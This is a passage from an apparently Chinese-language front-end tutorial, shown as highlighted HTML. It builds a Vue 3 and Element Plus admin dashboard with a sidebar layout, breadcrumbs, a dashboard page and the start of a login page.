<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">import</span> { computed, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useRoute, useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
<span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()

<span class="hljs-comment">// 侧边栏折叠控制</span>
<span class="hljs-keyword">const</span> isCollapse = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleSidebar</span> = (<span class="hljs-params"/>) =&gt; {
  isCollapse.<span class="hljs-property">value</span> = !isCollapse.<span class="hljs-property">value</span>
}

<span class="hljs-comment">// 当前激活菜单</span>
<span class="hljs-keyword">const</span> activeMenu = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> route.<span class="hljs-property">path</span>)

<span class="hljs-comment">// 面包屑数据生成</span>
<span class="hljs-keyword">const</span> breadcrumbs = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> matched = route.<span class="hljs-property">matched</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">meta</span> &amp;&amp; item.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span>)
  <span class="hljs-keyword">const</span> first = matched[<span class="hljs-number">0</span>]

  <span class="hljs-keyword">if</span> (!first || first.<span class="hljs-property">path</span> !== <span class="hljs-string">'/dashboard'</span>) {
    <span class="hljs-keyword">return</span> [{ <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>, <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'首页'</span> } }].<span class="hljs-title function_">concat</span>(matched)
  }
  <span class="hljs-keyword">return</span> matched
})

<span class="hljs-comment">// 退出登录</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogout</span> = (<span class="hljs-params"/>) =&gt; {
  router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
}

<span class="hljs-comment">// 下拉菜单指令处理</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleCommand</span> = (<span class="hljs-params">command</span>) =&gt; {
  <span class="hljs-keyword">if</span> (command === <span class="hljs-string">'logout'</span>) {
    <span class="hljs-title function_">handleLogout</span>()
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-container</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-wrapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 侧边栏 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sidebar-resize"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-aside</span> <span class="hljs-attr">:width</span>=<span class="hljs-string">"isCollapse ? '64px' : '220px'"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sidebar-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-container"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ collapsed: isCollapse }"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-box"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-element-plus</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-icon"</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-text"</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">"!isCollapse"</span>&gt;</span>Admin Elite<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">el-scrollbar</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-menu</span> <span class="hljs-attr">:default-active</span>=<span class="hljs-string">"activeMenu"</span> <span class="hljs-attr">:collapse</span>=<span class="hljs-string">"isCollapse"</span> <span class="hljs-attr">:collapse-transition</span>=<span class="hljs-string">"false"</span> <span class="hljs-attr">unique-opened</span> <span class="hljs-attr">router</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-menu-vertical"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/dashboard"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-odometer</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">title</span>&gt;</span>仪表盘<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">el-sub-menu</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/user"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">title</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-user</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>用户管理<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/user/list"</span>&gt;</span>用户列表<span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/user/role"</span>&gt;</span>角色权限<span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-sub-menu</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/settings"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-setting</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">title</span>&gt;</span>系统设置<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-scrollbar</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-aside</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 主容器 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-container</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main-container"</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- 顶部导航栏 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-left"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hamburger"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toggleSidebar"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ 'is-active': isCollapse }"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-fold</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!isCollapse"</span> /&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-expand</span> <span class="hljs-attr">v-else</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

          <span class="hljs-tag">&lt;<span class="hljs-name">el-breadcrumb</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"breadcrumb"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">el-breadcrumb-item</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in breadcrumbs"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.path"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"index === breadcrumbs.length - 1"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"no-redirect"</span>&gt;</span>{{ item.meta.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-else</span> @<span class="hljs-attr">click.prevent</span>=<span class="hljs-string">"router.push(item.path)"</span>&gt;</span>{{ item.meta.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-breadcrumb-item</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-breadcrumb</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-right"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown</span> <span class="hljs-attr">trigger</span>=<span class="hljs-string">"click"</span> @<span class="hljs-attr">command</span>=<span class="hljs-string">"handleCommand"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"avatar-wrapper"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-avatar</span> <span class="hljs-attr">:size</span>=<span class="hljs-string">"32"</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"userStore.avatar"</span> /&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-name"</span>&gt;</span>{{ userStore.username }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon--right"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-arrow-down</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">dropdown</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-menu</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-item</span>&gt;</span>个人中心<span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-item</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-item</span> <span class="hljs-attr">divided</span> <span class="hljs-attr">command</span>=<span class="hljs-string">"logout"</span>&gt;</span>退出登录<span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-item</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-menu</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-header</span>&gt;</span>

      <span class="hljs-comment">&lt;!-- 内容区 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-main"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> <span class="hljs-attr">v-slot</span>=<span class="hljs-string">"{ Component }"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fade-transform"</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"out-in"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"Component"</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-container</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-container</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.app-wrapper</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">display</span>: flex;
}

<span class="hljs-comment">/* Sidebar Styling - Light Theme */</span>
<span class="hljs-selector-class">.sidebar-container</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">var</span>(--el-border-color-light);
  <span class="hljs-attribute">transition</span>: width <span class="hljs-number">0.3s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.25</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">1</span>);
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">1001</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">29</span>, <span class="hljs-number">35</span>, <span class="hljs-number">41</span>, <span class="hljs-number">0.05</span>);

  <span class="hljs-selector-class">.logo-container</span> {
    <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>;
    <span class="hljs-attribute">flex-shrink</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
    <span class="hljs-attribute">justify-content</span>: center;
    // <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">var</span>(--el-border-color-lighter);
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffffff</span>;
    <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
    <span class="hljs-attribute">overflow</span>: hidden;

    <span class="hljs-selector-class">.logo-box</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">32px</span>;
      <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">justify-content</span>: center;
      <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
    }

    <span class="hljs-selector-class">.logo-text</span> {
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-primary);
      <span class="hljs-attribute">white-space</span>: nowrap;
      <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Inter'</span>, sans-serif;
    }

    &amp;<span class="hljs-selector-class">.collapsed</span> {
      <span class="hljs-selector-class">.logo-box</span> {
        <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">0</span>;
      }
    }
  }

  <span class="hljs-selector-class">.el-menu-vertical</span> {
    <span class="hljs-attribute">border-right</span>: none;

    :<span class="hljs-built_in">deep</span>(.el-menu-item) {
      &amp;<span class="hljs-selector-class">.is-active</span> {
        <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--el-color-primary-light-<span class="hljs-number">9</span>);
        <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
        <span class="hljs-attribute">border-right</span>: <span class="hljs-number">3px</span> solid <span class="hljs-built_in">var</span>(--el-color-primary);
      }

      &amp;<span class="hljs-selector-pseudo">:hover</span> {
        <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--el-fill-color-light);
      }
    }
  }
}

<span class="hljs-comment">/* Navbar Styling */</span>
<span class="hljs-selector-class">.navbar</span> {
  <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">41</span>, <span class="hljs-number">0.08</span>);
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: space-between;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;

  <span class="hljs-selector-class">.navbar-left</span> {
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
  }

  <span class="hljs-selector-class">.hamburger</span> {
    <span class="hljs-attribute">cursor</span>: pointer;
    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
    <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-regular);
    <span class="hljs-attribute">transition</span>: color <span class="hljs-number">0.3s</span>;

    &amp;<span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
    }
  }

  <span class="hljs-selector-class">.breadcrumb</span> {
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">50px</span>;

    <span class="hljs-selector-class">.no-redirect</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-primary);
      <span class="hljs-attribute">cursor</span>: text;
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
    }

    <span class="hljs-selector-tag">a</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-regular);
      <span class="hljs-attribute">cursor</span>: pointer;
      <span class="hljs-attribute">font-weight</span>: normal;

      &amp;<span class="hljs-selector-pseudo">:hover</span> {
        <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
      }
    }
  }

  <span class="hljs-selector-class">.navbar-right</span> {
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;

    <span class="hljs-selector-class">.avatar-wrapper</span> {
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">cursor</span>: pointer;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">transition</span>: background <span class="hljs-number">0.3s</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;

      &amp;<span class="hljs-selector-pseudo">:hover</span> {
        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.025</span>);
      }

      <span class="hljs-selector-class">.user-name</span> {
        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span>;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
        <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-regular);
      }
    }
  }
}

<span class="hljs-comment">/* Main Content Styling */</span>
<span class="hljs-selector-class">.main-container</span> {
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">transition</span>: margin-left <span class="hljs-number">0.28s</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--app-bg-color);
}

<span class="hljs-selector-class">.app-main</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">overflow-x</span>: hidden;
}

<span class="hljs-comment">/* Transitions */</span>
<span class="hljs-selector-class">.fade-transform-enter-active</span>,
<span class="hljs-selector-class">.fade-transform-leave-active</span> {
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.5s</span>;
}

<span class="hljs-selector-class">.fade-transform-enter-from</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">30px</span>);
}

<span class="hljs-selector-class">.fade-transform-leave-to</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">30px</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-14">创建基础页面</h3>
<p>在 <code>src/views</code> 下创建自己的业务页面，新建 <code>src/views/dashboard/index.vue</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-card</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">header</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-header"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Dashboard<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"welcome-text"</span>&gt;</span>
      欢迎使用 Element Plus 后台管理系统
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-card</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.welcome-text</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">登录页面</h3>
<p>为了有头有脸再用 AI 搞个登录页面 <code>src/views/login</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { getUserInfo, login } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/user'</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">import</span> { reactive, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
<span class="hljs-keyword">const</span> loginFormRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

<span class="hljs-keyword">const</span> loginForm = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">rememberMe</span>: <span class="hljs-literal">false</span>,
})

<span class="hljs-keyword">const</span> loginRules = {
  <span class="hljs-attr">username</span>: [
    { <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'请输入用户名'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
    { <span class="hljs-attr">min</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'用户名长度不能少于3位'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
  ],
  <span class="hljs-attr">password</span>: [
    { <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'请输入密码'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
    { <span class="hljs-attr">min</span>: <span class="hljs-number">6</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'密码长度不能少于6位'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
  ],
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (!loginFormRef.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">await</span> loginFormRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">validate</span>(<span class="hljs-keyword">async</span> (valid) =&gt; {
    <span class="hljs-keyword">if</span> (valid) {
      loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>

      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">login</span>(loginForm)

        <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
        userStore.<span class="hljs-property">token</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">token</span>

        <span class="hljs-keyword">const</span> userInfo = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserInfo</span>()
        userStore.<span class="hljs-property">avatar</span> = userInfo.<span class="hljs-property">data</span>.<span class="hljs-property">avatar</span>
        userStore.<span class="hljs-property">username</span> = userInfo.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(res.<span class="hljs-property">message</span> || <span class="hljs-string">'登录成功'</span>)
        router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/'</span>)
      } <span class="hljs-keyword">finally</span> {
        loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
      }
    }
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
